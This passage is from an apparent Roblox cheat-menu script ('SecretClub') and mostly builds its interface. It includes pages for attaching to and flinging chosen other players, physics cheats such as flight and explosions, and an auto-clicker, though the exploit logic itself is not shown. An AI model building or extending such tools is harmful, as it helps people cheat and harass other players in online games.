        AnimDropdownContainer.Visible = false
    end
end)

AnimDropdownBtn.MouseEnter:Connect(function()
    TweenService:Create(AnimDropdownBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 140, 220)}):Play()
end)

AnimDropdownBtn.MouseLeave:Connect(function()
    TweenService:Create(AnimDropdownBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(35, 35, 45)}):Play()
end)

-- Поиск анимаций
AnimSearchBox:GetPropertyChangedSignal("Text"):Connect(function()
    local searchText = string.lower(AnimSearchBox.Text)
    for _, btn in pairs(animButtons) do
        btn.Visible = searchText == "" or string.find(string.lower(btn.Text), searchText, 1, true) ~= nil
    end
end)

-- Закрытие при клике вне dropdown
UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 and animDropdownOpen then
        local mousePos = UserInputService:GetMouseLocation()
        local btnPos = AnimDropdownBtn.AbsolutePosition
        local btnSize = AnimDropdownBtn.AbsoluteSize
        local dropPos = AnimDropdownContainer.AbsolutePosition
        local dropSize = AnimDropdownContainer.AbsoluteSize
        
        local insideBtn = mousePos.X >= btnPos.X and mousePos.X <= btnPos.X + btnSize.X and 
                         mousePos.Y >= btnPos.Y and mousePos.Y <= btnPos.Y + btnSize.Y
        local insideDrop = mousePos.X >= dropPos.X and mousePos.X <= dropPos.X + dropSize.X and 
                          mousePos.Y >= dropPos.Y and mousePos.Y <= dropPos.Y + dropSize.Y
        
        if not insideBtn and not insideDrop then
            animDropdownOpen = false
            TweenService:Create(AnimDropdownContainer, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Size = UDim2.new(1, 0, 0, 0)}):Play()
            task.wait(0.2)
            AnimDropdownContainer.Visible = false
        end
    end
end)
end

-- ========================================
-- STAND ATTACH PAGE
-- ========================================
local AttachPage, AttachLeft, AttachRight
do
AttachPage, AttachLeft, AttachRight = createPage()

local AttachHeader = createSectionHeader("Stand Attach")
AttachHeader.Parent = AttachLeft

local targetContainer, targetTextBox = createTextBox(AttachLeft, "Target Player:", "Type name...", function(text)
    if text ~= "" then
        local found = SearchPlayer(text)
        if found then
            AttachSettings.target = found.Name
            targetTextBox.Text = found.Name
            print("✅ Target set: " .. found.Name)
        else
            print("❌ Player not found!")
        end
    end
end)

createToggle(AttachLeft, "Enable Attach", false, function(enabled) AttachSettings.attach = enabled end)
createSlider(AttachLeft, "Distance", -10, 8, 2, function(value) AttachSettings.distance = value end)
createSlider(AttachLeft, "Height", -20, 20, 0, function(value) AttachSettings.height = value end)

local QuickSelectHeader = createSectionHeader("Quick Select")
QuickSelectHeader.Parent = AttachRight

local QuickSelectBtn = Instance.new("TextButton")
QuickSelectBtn.Size = UDim2.new(1, 0, 0, 35)
QuickSelectBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
QuickSelectBtn.Text = "▼ Select Player"
QuickSelectBtn.Font = Enum.Font.Gotham
QuickSelectBtn.TextSize = 13
QuickSelectBtn.TextColor3 = Color3.fromRGB(220, 220, 220)
QuickSelectBtn.TextXAlignment = Enum.TextXAlignment.Left
QuickSelectBtn.BorderSizePixel = 0
QuickSelectBtn.Parent = AttachRight

local QSCorner = Instance.new("UICorner")
QSCorner.CornerRadius = UDim.new(0, 20)
QSCorner.Parent = QuickSelectBtn

local QSPadding = Instance.new("UIPadding")
QSPadding.PaddingLeft = UDim.new(0, 12)
QSPadding.Parent = QuickSelectBtn

local QuickSelectDropdown = Instance.new("Frame")
QuickSelectDropdown.Size = UDim2.new(1, 0, 0, 0)
QuickSelectDropdown.Position = UDim2.new(0, 0, 1, 2)
QuickSelectDropdown.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
QuickSelectDropdown.BorderSizePixel = 0
QuickSelectDropdown.Visible = false
QuickSelectDropdown.ZIndex = 100
QuickSelectDropdown.ClipsDescendants = true
QuickSelectDropdown.Parent = QuickSelectBtn

local QSDropCorner = Instance.new("UICorner")
QSDropCorner.CornerRadius = UDim.new(0, 20)
QSDropCorner.Parent = QuickSelectDropdown

local QSScroll = Instance.new("ScrollingFrame")
QSScroll.Size = UDim2.new(1, -8, 1, -8)
QSScroll.Position = UDim2.new(0, 4, 0, 4)
QSScroll.BackgroundTransparency = 1
QSScroll.ScrollBarThickness = 3
QSScroll.ScrollBarImageColor3 = Color3.fromRGB(60, 140, 220)
QSScroll.BorderSizePixel = 0
QSScroll.ZIndex = 101
QSScroll.Parent = QuickSelectDropdown

local QSLayout = Instance.new("UIListLayout")
QSLayout.Padding = UDim.new(0, 3)
QSLayout.Parent = QSScroll

local dropdownOpen = false

local function updateQuickSelectList()
    for _, child in pairs(QSScroll:GetChildren()) do
        if child:IsA("TextButton") then
            child:Destroy()
        end
    end
    
    local playerCount = 0
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            playerCount = playerCount + 1
            local PlayerBtn = Instance.new("TextButton")
            PlayerBtn.Size = UDim2.new(1, -6, 0, 32)
            PlayerBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
            PlayerBtn.Text = "👤 " .. plr.Name
            PlayerBtn.Font = Enum.Font.Gotham
            PlayerBtn.TextSize = 12
            PlayerBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
            PlayerBtn.TextXAlignment = Enum.TextXAlignment.Left
            PlayerBtn.BorderSizePixel = 0
            PlayerBtn.ZIndex = 102
            PlayerBtn.Parent = QSScroll
            
            local PBCorner = Instance.new("UICorner")
            PBCorner.CornerRadius = UDim.new(0, 15)
            PBCorner.Parent = PlayerBtn
            
            local PBPadding = Instance.new("UIPadding")
            PBPadding.PaddingLeft = UDim.new(0, 10)
            PBPadding.Parent = PlayerBtn
            
            PlayerBtn.MouseEnter:Connect(function()
                TweenService:Create(PlayerBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(60, 140, 220)}):Play()
            end)
            
            PlayerBtn.MouseLeave:Connect(function()
                TweenService:Create(PlayerBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(40, 40, 50)}):Play()
            end)
            
            PlayerBtn.MouseButton1Click:Connect(function()
                AttachSettings.target = plr.Name
                targetTextBox.Text = plr.Name
                QuickSelectBtn.Text = "▼ " .. plr.Name
                dropdownOpen = false
                TweenService:Create(QuickSelectDropdown, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Size = UDim2.new(1, 0, 0, 0)}):Play()
                task.wait(0.2)
                QuickSelectDropdown.Visible = false
            end)
        end
    end
    
    local contentHeight = playerCount * 35
    QSScroll.CanvasSize = UDim2.new(0, 0, 0, contentHeight)
end

QuickSelectBtn.MouseButton1Click:Connect(function()
    dropdownOpen = not dropdownOpen
    
    if dropdownOpen then
        updateQuickSelectList()
        QuickSelectDropdown.Visible = true
        QuickSelectDropdown.Size = UDim2.new(1, 0, 0, 0)
        local targetHeight = math.min(#Players:GetPlayers() * 35, 200)
        TweenService:Create(QuickSelectDropdown, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {Size = UDim2.new(1, 0, 0, targetHeight)}):Play()
    else
        TweenService:Create(QuickSelectDropdown, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Size = UDim2.new(1, 0, 0, 0)}):Play()
        task.wait(0.2)
        QuickSelectDropdown.Visible = false
    end
end)

QuickSelectBtn.MouseEnter:Connect(function()
    TweenService:Create(QuickSelectBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 140, 220)}):Play()
end)

QuickSelectBtn.MouseLeave:Connect(function()
    TweenService:Create(QuickSelectBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(35, 35, 45)}):Play()
end)

Players.PlayerAdded:Connect(function(plr)
    task.wait(0.3)
    if dropdownOpen then
        updateQuickSelectList()
    end
end)

UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 and dropdownOpen then
        local mousePos = UserInputService:GetMouseLocation()
        local btnPos = QuickSelectBtn.AbsolutePosition
        local btnSize = QuickSelectBtn.AbsoluteSize
        local dropPos = QuickSelectDropdown.AbsolutePosition
        local dropSize = QuickSelectDropdown.AbsoluteSize
        
        local insideBtn = mousePos.X >= btnPos.X and mousePos.X <= btnPos.X + btnSize.X and 
                         mousePos.Y >= btnPos.Y and mousePos.Y <= btnPos.Y + btnSize.Y
        local insideDrop = mousePos.X >= dropPos.X and mousePos.X <= dropPos.X + dropSize.X and 
                          mousePos.Y >= dropPos.Y and mousePos.Y <= dropPos.Y + dropSize.Y
        
        if not insideBtn and not insideDrop then
            dropdownOpen = false
            TweenService:Create(QuickSelectDropdown, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Size = UDim2.new(1, 0, 0, 0)}):Play()
            task.wait(0.2)
            QuickSelectDropdown.Visible = false
        end
    end
end)
end

-- ========================================
-- PHYSICS LAB PAGE
-- ========================================
local PhysicsPage, PhysicsLeft, PhysicsRight
do
PhysicsPage, PhysicsLeft, PhysicsRight = createPage()

local PhysicsHeader = createSectionHeader("Physics Lab")
PhysicsHeader.Parent = PhysicsLeft

createToggle(PhysicsLeft, "Black Hole", false, function(enabled) blackholeActive = enabled end)
createToggle(PhysicsLeft, "Vacuum Cannon", false, function(enabled) vacuumActive = enabled end)
createToggle(PhysicsLeft, "Seismic Strike", false, function(enabled) seismicActive = enabled end)
createToggle(PhysicsLeft, "Super Kick", false, function(enabled) kickActive = enabled end)

createToggle(PhysicsRight, "Steel Body", false, function(enabled)
    unshakeable = enabled
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if hrp then
        hrp.CustomPhysicalProperties = enabled and PhysicalProperties.new(100, 0.3, 0.5) or nil
    end
end)

createToggle(PhysicsRight, "Spider Mode", false, function(enabled) spiderMode = enabled end)
createToggle(PhysicsRight, "Air Walk", false, function(enabled) airWalk = enabled end)
createToggle(PhysicsRight, "Physics Flight", false, function(enabled) flying_physics = enabled end)

createButton(PhysicsRight, "💥 Explosive Jump", function()
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if hrp then
        local exp = Instance.new("Explosion", workspace)
        exp.Position = hrp.Position + Vector3.new(0, -3, 0)
        exp.BlastRadius = 15
        exp.BlastPressure = 1000000
    end
end)

createButton(PhysicsRight, "🔄 Reset All Physics", function()
    seismicActive = false
    vacuumActive = false
    kickActive = false
    spiderMode = false
    airWalk = false
    flying_physics = false
    unshakeable = false
    blackholeActive = false
    workspace.Gravity = 196.2
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if hrp then
        if hrp:FindFirstChild("FlyBV") then hrp.FlyBV:Destroy() end
        hrp.CustomPhysicalProperties = nil
    end
end)
end

-- ========================================
-- GHOST HUB PAGE
-- ========================================
local GhostPage, GhostLeft, GhostRight
do
GhostPage, GhostLeft, GhostRight = createPage()

local GhostHeader = createSectionHeader("Fling")
GhostHeader.Parent = GhostLeft

local PlayerSelPanel = Instance.new("Frame")
PlayerSelPanel.Size = UDim2.new(1, 0, 0, 40)
PlayerSelPanel.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
PlayerSelPanel.Parent = GhostLeft

local PlayerSelCorner = Instance.new("UICorner")
PlayerSelCorner.CornerRadius = UDim.new(0, 20)
PlayerSelCorner.Parent = PlayerSelPanel

local PlayerLabel = Instance.new("TextLabel")
PlayerLabel.Size = UDim2.new(0.6, 0, 1, 0)
PlayerLabel.Position = UDim2.new(0, 8, 0, 0)
PlayerLabel.BackgroundTransparency = 1
PlayerLabel.Text = "Target: None"
PlayerLabel.Font = Enum.Font.Gotham
PlayerLabel.TextSize = 11
PlayerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
PlayerLabel.TextXAlignment = Enum.TextXAlignment.Left
PlayerLabel.Parent = PlayerSelPanel

local SelectBtn = Instance.new("TextButton")
SelectBtn.Size = UDim2.new(0, 80, 0, 28)
SelectBtn.Position = UDim2.new(1, -86, 0.5, -14)
SelectBtn.BackgroundColor3 = Color3.fromRGB(60, 140, 220)
SelectBtn.Text = "Select"
SelectBtn.Font = Enum.Font.Gotham
SelectBtn.TextSize = 11
SelectBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SelectBtn.BorderSizePixel = 0
SelectBtn.Parent = PlayerSelPanel

local SelectBtnCorner = Instance.new("UICorner")
SelectBtnCorner.CornerRadius = UDim.new(0, 20)
SelectBtnCorner.Parent = SelectBtn

local PlayerDropdown = Instance.new("Frame")
PlayerDropdown.Size = UDim2.new(1, 0, 0, 200)
PlayerDropdown.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
PlayerDropdown.BorderSizePixel = 0
PlayerDropdown.Visible = false
PlayerDropdown.ZIndex = 50
PlayerDropdown.Parent = GhostPage

local DropdownCorner = Instance.new("UICorner")
DropdownCorner.CornerRadius = UDim.new(0, 20)
DropdownCorner.Parent = PlayerDropdown

local PlayerScroll = Instance.new("ScrollingFrame")
PlayerScroll.Size = UDim2.new(1, -8, 1, -8)
PlayerScroll.Position = UDim2.new(0, 4, 0, 4)
PlayerScroll.BackgroundTransparency = 1
PlayerScroll.ScrollBarThickness = 4
PlayerScroll.ZIndex = 51
PlayerScroll.Parent = PlayerDropdown

local PlayerLayout = Instance.new("UIListLayout")
PlayerLayout.Padding = UDim.new(0, 4)
PlayerLayout.Parent = PlayerScroll

UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        if PlayerDropdown.Visible then
            local mousePos = UserInputService:GetMouseLocation()
            local dropdownPos = PlayerDropdown.AbsolutePosition
            local dropdownSize = PlayerDropdown.AbsoluteSize
            if mousePos.X < dropdownPos.X or mousePos.X > dropdownPos.X + dropdownSize.X or
               mousePos.Y < dropdownPos.Y or mousePos.Y > dropdownPos.Y + dropdownSize.Y then
                local selectBtnPos = SelectBtn.AbsolutePosition
                local selectBtnSize = SelectBtn.AbsoluteSize
                if mousePos.X < selectBtnPos.X or mousePos.X > selectBtnPos.X + selectBtnSize.X or
                   mousePos.Y < selectBtnPos.Y or mousePos.Y > selectBtnPos.Y + selectBtnSize.Y then
                    PlayerDropdown.Visible = false
                end
            end
        end
    end
end)

SelectBtn.MouseButton1Click:Connect(function()
    PlayerDropdown.Visible = not PlayerDropdown.Visible
    if PlayerDropdown.Visible then
        for _, child in pairs(PlayerScroll:GetChildren()) do
            if child:IsA("TextButton") then child:Destroy() end
        end
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                local PlayerBtn = Instance.new("TextButton")
                PlayerBtn.Size = UDim2.new(1, -8, 0, 28)
                PlayerBtn.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
                PlayerBtn.Text = plr.DisplayName
                PlayerBtn.Font = Enum.Font.Gotham
                PlayerBtn.TextSize = 11
                PlayerBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
                PlayerBtn.BorderSizePixel = 0
                PlayerBtn.ZIndex = 52
                PlayerBtn.Parent = PlayerScroll
                local PlayerBtnCorner = Instance.new("UICorner")
                PlayerBtnCorner.CornerRadius = UDim.new(0, 20)
                PlayerBtnCorner.Parent = PlayerBtn
                PlayerBtn.MouseButton1Click:Connect(function()
                    gh_selectedPlayer = plr
                    PlayerLabel.Text = "Target: " .. plr.DisplayName
                    PlayerLabel.TextColor3 = Color3.fromRGB(100, 255, 140)
                    PlayerDropdown.Visible = false
                end)
            end
        end
        PlayerScroll.CanvasSize = UDim2.new(0, 0, 0, PlayerLayout.AbsoluteContentSize.Y + 8)
    end
end)

createToggle(GhostLeft, "Attraction", false, function(enabled) gh_isRunning = enabled end)
createToggle(GhostLeft, "Ghost Fling", false, function(enabled) gh_isFlingActive = enabled end)
createToggle(GhostRight, "Auto Reset", false, function(enabled) gh_isAutoResetEnabled = enabled end)
createToggle(GhostRight, "Auto-Click [K]", false, function(enabled) _G.AutoClicker = enabled end)
createSlider(GhostRight, "Predict", 0, 100, 30, function(value) _G.PredictValue = value / 100 end)
createSlider(GhostRight, "Reset Interval", 1, 10, 5, function(value) gh_resetInterval = value end)
end

-- ========================================
-- SIDEBAR SETUP
-- ========================================
createSidebarLabel("Main", 12)
createSidebarButton("🏃", "Movement", 35, true, Color3.fromRGB(60, 140, 220), MovementPage)
currentActiveButton = allButtons[1].Button

createSidebarLabel("Visuals", 90)
createSidebarButton("👤", "Players", 113, false, Color3.fromRGB(60, 140, 220), PlayersPage)

createSidebarLabel("Stand", 168)
createSidebarButton("🎮", "Stand Pilot", 191, false, Color3.fromRGB(140, 100, 255), StandPilotPage)
createSidebarButton("🔗", "Stand Attach", 230, false, Color3.fromRGB(140, 100, 255), AttachPage)

createSidebarLabel("Fun", 285)
createSidebarButton("👻", "Fun & Dance", 308, false, Color3.fromRGB(100, 255, 140), FunPage)

createSidebarLabel("Advanced", 363)
createSidebarButton("⚗️", "Physics Lab", 386, false, Color3.fromRGB(255, 140, 60), PhysicsPage)
createSidebarButton("🌀", "Fling", 425, false, Color3.fromRGB(255, 60, 140), GhostPage)

-- Bottom panel
local BottomPanel = Instance.new("Frame")
BottomPanel.Size = UDim2.new(1, -20, 0, 48)
BottomPanel.Position = UDim2.new(0, 10, 1, -58)
BottomPanel.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
BottomPanel.BorderSizePixel = 0
BottomPanel.Parent = Sidebar

local BottomCorner = Instance.new("UICorner")
BottomCorner.CornerRadius = UDim.new(0, 20)
BottomCorner.Parent = BottomPanel

local ExarationLabel = Instance.new("TextLabel")
ExarationLabel.Size = UDim2.new(1, -20, 0, 16)
ExarationLabel.Position = UDim2.new(0, 10, 0, 8)
ExarationLabel.BackgroundTransparency = 1
ExarationLabel.Text = "SecretClub"
ExarationLabel.Font = Enum.Font.Gotham
ExarationLabel.TextSize = 11
ExarationLabel.TextColor3 = Color3.fromRGB(140, 140, 140)
ExarationLabel.TextXAlignment = Enum.TextXAlignment.Left
ExarationLabel.Parent = BottomPanel

local TimeLabel = Instance.new("TextLabel")
TimeLabel.Size = UDim2.new(1, -20, 0, 16)
TimeLabel.Position = UDim2.new(0, 10, 0, 26)
TimeLabel.BackgroundTransparency = 1
TimeLabel.Text = "v1.0"
TimeLabel.Font = Enum.Font.Gotham
TimeLabel.TextSize = 10
TimeLabel.TextColor3 = Color3.fromRGB(60, 140, 220)
TimeLabel.TextXAlignment = Enum.TextXAlignment.Left
TimeLabel.Parent = BottomPanel


-- ========================================
-- THEME SYSTEM
-- ========================================
local Themes = {
    {Name = "Blue", Color = Color3.fromRGB(60, 140, 220), BgDark = Color3.fromRGB(14, 14, 14), BgMedium = Color3.fromRGB(18, 18, 18), BgLight = Color3.fromRGB(24, 24, 24)},
    {Name = "Purple", Color = Color3.fromRGB(140, 100, 255), BgDark = Color3.fromRGB(14, 10, 20), BgMedium = Color3.fromRGB(20, 14, 26), BgLight = Color3.fromRGB(28, 20, 35)},
    {Name = "Green", Color = Color3.fromRGB(100, 255, 140), BgDark = Color3.fromRGB(10, 18, 12), BgMedium = Color3.fromRGB(14, 24, 16), BgLight = Color3.fromRGB(20, 32, 22)},
    {Name = "Red", Color = Color3.fromRGB(255, 80, 100), BgDark = Color3.fromRGB(18, 10, 10), BgMedium = Color3.fromRGB(24, 14, 14), BgLight = Color3.fromRGB(32, 20, 20)},
    {Name = "Orange", Color = Color3.fromRGB(255, 140, 60), BgDark = Color3.fromRGB(18, 14, 10), BgMedium = Color3.fromRGB(24, 18, 14), BgLight = Color3.fromRGB(32, 24, 18)}
}
local CurrentThemeIndex = 1
local CurrentTheme = Themes[1]  -- Храним текущую тему

local function ApplyTheme(theme)
    CurrentTheme = theme  -- Сохраняем текущую тему
    
    -- MainFrame
    TweenService:Create(MainFrame, TweenInfo.new(0.3), {BackgroundColor3 = theme.BgLight}):Play()
    TweenService:Create(TopBar, TweenInfo.new(0.3), {BackgroundColor3 = theme.BgLight}):Play()
    TweenService:Create(Sidebar, TweenInfo.new(0.3), {BackgroundColor3 = theme.BgMedium}):Play()
    TweenService:Create(Sidebar, TweenInfo.new(0.3), {ScrollBarImageColor3 = theme.Color}):Play()
    TweenService:Create(BottomPanel, TweenInfo.new(0.3), {BackgroundColor3 = theme.BgDark}):Play()
    TweenService:Create(TimeLabel, TweenInfo.new(0.3), {TextColor3 = theme.Color}):Play()
    
    -- Pages background
    for _, page in pairs({MovementPage, PlayersPage, StandPilotPage, FunPage, AttachPage, PhysicsPage, GhostPage}) do
        if page then
            TweenService:Create(page, TweenInfo.new(0.3), {BackgroundColor3 = theme.BgLight}):Play()
        end
    end
    
    -- Обновляем все Toggle переключатели и другие элементы
    for _, page in pairs({MovementPage, PlayersPage, StandPilotPage, FunPage, AttachPage, PhysicsPage, GhostPage}) do
        if page then
            for _, child in pairs(page:GetDescendants()) do
                -- Toggle switches
                if child:IsA("TextButton") and child.Name == "ToggleSwitch" then
                    -- Проверяем активен ли toggle по цвету
                    if child.BackgroundColor3.R > 0.3 or child.BackgroundColor3.G > 0.3 or child.BackgroundColor3.B > 0.3 then
                        TweenService:Create(child, TweenInfo.new(0.3), {BackgroundColor3 = theme.Color}):Play()
                    end
                end
                -- Слайдеры
                if child.Name == "SliderFill" or child.Name == "SliderDot" then
                    TweenService:Create(child, TweenInfo.new(0.3), {BackgroundColor3 = theme.Color}):Play()
                end
            end
        end
    end
    
    -- Обновляем ScrollBars
    if AnimScroll then
        TweenService:Create(AnimScroll, TweenInfo.new(0.3), {ScrollBarImageColor3 = theme.Color}):Play()
    end
    if QSScroll then
        TweenService:Create(QSScroll, TweenInfo.new(0.3), {ScrollBarImageColor3 = theme.Color}):Play()
    end
    
    -- Обновляем иконки в Sidebar
    for _, button in pairs(Sidebar:GetChildren()) do
        if button:IsA("TextButton") and button:FindFirstChild("Icon") then
            local icon = button:FindFirstChild("Icon")
            -- Проверяем активна ли кнопка
            if button.BackgroundColor3 ~= Color3.fromRGB(24, 24, 24) then
                TweenService:Create(button, TweenInfo.new(0.3), {BackgroundColor3 = theme.Color}):Play()
                TweenService:Create(icon, TweenInfo.new(0.3), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
            else
                TweenService:Create(icon, TweenInfo.new(0.3), {TextColor3 = theme.Color}):Play()
            end
        end
    end
    
    -- Обновляем Settings кнопку в TopBar
    for _, child in pairs(TopBar:GetChildren()) do
        if child:IsA("TextButton") and child.Text == "⚙️" then
            local settingsStroke = child:FindFirstChildOfClass("UIStroke")
            if settingsStroke then
                TweenService:Create(settingsStroke, TweenInfo.new(0.3), {Color = theme.Color}):Play()
            end
        end
    end
    
    -- Обновляем MainFrame Stroke
    local mainStroke = MainFrame:FindFirstChildOfClass("UIStroke")
    if mainStroke then
        TweenService:Create(mainStroke, TweenInfo.new(0.3), {Color = theme.Color}):Play()
    end
    
    -- Обновляем TopBar Stroke
    local topStroke = TopBar:FindFirstChildOfClass("UIStroke")
    if topStroke then
        TweenService:Create(topStroke, TweenInfo.new(0.3), {Color = theme.Color}):Play()
    end
end

-- ========================================
-- SYSTEM MONITOR (с ИСПРАВЛЕННЫМ Color Picker!)
-- ========================================
do
local MonitorFrame = Instance.new("Frame")
MonitorFrame.Name = "SystemMonitor"
MonitorFrame.Size = UDim2.new(0, 380, 0, 520)
MonitorFrame.Position = UDim2.new(0.5, -190, 0.5, -260)
MonitorFrame.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
MonitorFrame.Visible = false
MonitorFrame.BorderSizePixel = 0
MonitorFrame.ZIndex = 150
MonitorFrame.Parent = ScreenGui

local MonitorCorner = Instance.new("UICorner")
MonitorCorner.CornerRadius = UDim.new(0, 8)
MonitorCorner.Parent = MonitorFrame

local MonitorStroke = Instance.new("UIStroke")
MonitorStroke.Color = Color3.fromRGB(60, 140, 220)
MonitorStroke.Thickness = 2
MonitorStroke.Parent = MonitorFrame

-- Dragging System
local MonitorDragging = false
local MonitorDragInput, MonitorDragStart, MonitorStartPos

local function updateMonitorDrag(input)
    local delta = input.Position - MonitorDragStart
    TweenService:Create(MonitorFrame, TweenInfo.new(0.1), {
        Position = UDim2.new(MonitorStartPos.X.Scale, MonitorStartPos.X.Offset + delta.X, MonitorStartPos.Y.Scale, MonitorStartPos.Y.Offset + delta.Y)
    }):Play()
end

MonitorFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        MonitorDragging = true
        MonitorDragStart = input.Position
        MonitorStartPos = MonitorFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then MonitorDragging = false end
        end)
    end
end)

MonitorFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then MonitorDragInput = input end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == MonitorDragInput and MonitorDragging then updateMonitorDrag(input) end
end)

-- Top Bar
local MonitorTopBar = Instance.new("Frame")
MonitorTopBar.Size = UDim2.new(1, 0, 0, 50)
MonitorTopBar.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MonitorTopBar.BorderSizePixel = 0
MonitorTopBar.ZIndex = 151
MonitorTopBar.Parent = MonitorFrame

local MonitorTopCorner = Instance.new("UICorner")
MonitorTopCorner.CornerRadius = UDim.new(0, 8)
MonitorTopCorner.Parent = MonitorTopBar

local MonitorTitle = Instance.new("TextLabel")
MonitorTitle.Size = UDim2.new(1, -100, 1, 0)
MonitorTitle.Position = UDim2.new(0, 20, 0, 0)
MonitorTitle.BackgroundTransparency = 1
MonitorTitle.Text = "⚙️ SYSTEM MONITOR"
MonitorTitle.TextColor3 = Color3.fromRGB(60, 140, 220)
MonitorTitle.Font = Enum.Font.GothamBold
MonitorTitle.TextSize = 16
MonitorTitle.TextXAlignment = Enum.TextXAlignment.Left
MonitorTitle.ZIndex = 152
MonitorTitle.Parent = MonitorTopBar

local CloseMonitorBtn = Instance.new("TextButton")
CloseMonitorBtn.Size = UDim2.new(0, 35, 0, 35)
CloseMonitorBtn.Position = UDim2.new(1, -43, 0, 8)
CloseMonitorBtn.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
CloseMonitorBtn.Text = "×"
CloseMonitorBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
CloseMonitorBtn.Font = Enum.Font.GothamBold
CloseMonitorBtn.TextSize = 22
CloseMonitorBtn.BorderSizePixel = 0
CloseMonitorBtn.ZIndex = 152
CloseMonitorBtn.Parent = MonitorTopBar

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 6)
CloseCorner.Parent = CloseMonitorBtn

CloseMonitorBtn.MouseEnter:Connect(function()
    TweenService:Create(CloseMonitorBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(200, 60, 60)}):Play()
end)
CloseMonitorBtn.MouseLeave:Connect(function()
    TweenService:Create(CloseMonitorBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(32, 32, 32)}):Play()
end)
CloseMonitorBtn.MouseButton1Click:Connect(function() MonitorFrame.Visible = false end)

-- Content Container
local MonitorScroll = Instance.new("ScrollingFrame")
MonitorScroll.Position = UDim2.new(0, 0, 0, 50)
MonitorScroll.Size = UDim2.new(1, 0, 1, -50)
MonitorScroll.BackgroundTransparency = 1
MonitorScroll.BorderSizePixel = 0
MonitorScroll.ScrollBarThickness = 4
MonitorScroll.ScrollBarImageColor3 = Color3.fromRGB(60, 140, 220)
MonitorScroll.CanvasSize = UDim2.new(0, 0, 0, 700)
MonitorScroll.ZIndex = 151
MonitorScroll.Parent = MonitorFrame

local MonitorList = Instance.new("UIListLayout")
MonitorList.HorizontalAlignment = Enum.HorizontalAlignment.Center
MonitorList.Padding = UDim.new(0, 8)
MonitorList.Parent = MonitorScroll

MonitorList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    MonitorScroll.CanvasSize = UDim2.new(0, 0, 0, MonitorList.AbsoluteContentSize.Y + 20)
end)

-- Section Headers
local function createMonitorSection(name)
    local Section = Instance.new("Frame")
    Section.Size = UDim2.new(0.9, 0, 0, 30)
    Section.BackgroundTransparency = 1
    Section.ZIndex = 152
    Section.Parent = MonitorScroll
    
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, 0, 1, 0)
    Label.BackgroundTransparency = 1
    Label.Text = name
    Label.TextColor3 = Color3.fromRGB(100, 100, 100)
    Label.Font = Enum.Font.GothamBold
    Label.TextSize = 11
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.ZIndex = 153
    Label.Parent = Section
    
    local Line = Instance.new("Frame")
    Line.Size = UDim2.new(1, 0, 0, 1)
    Line.Position = UDim2.new(0, 0, 1, -1)
    Line.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    Line.BorderSizePixel = 0
    Line.ZIndex = 153
    Line.Parent = Section
    
    return Section
end

local function createMonitorRow(name, isBtn)
    local Frame = Instance.new("TextButton")
    Frame.Size = UDim2.new(0.9, 0, 0, 38)
    Frame.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
    Frame.AutoButtonColor = false
    Frame.Text = ""
    Frame.ZIndex = 152
    Frame.Parent = MonitorScroll
    
    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 20)
    Corner.Parent = Frame
    
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, -20, 1, 0)
    Label.Position = UDim2.new(0, 15, 0, 0)
    Label.BackgroundTransparency = 1
    Label.TextColor3 = Color3.fromRGB(200, 200, 200)
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 12
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Text = name .. ": --"
    Label.ZIndex = 153
    Label.Parent = Frame
    
    if isBtn then
        Frame.MouseEnter:Connect(function()
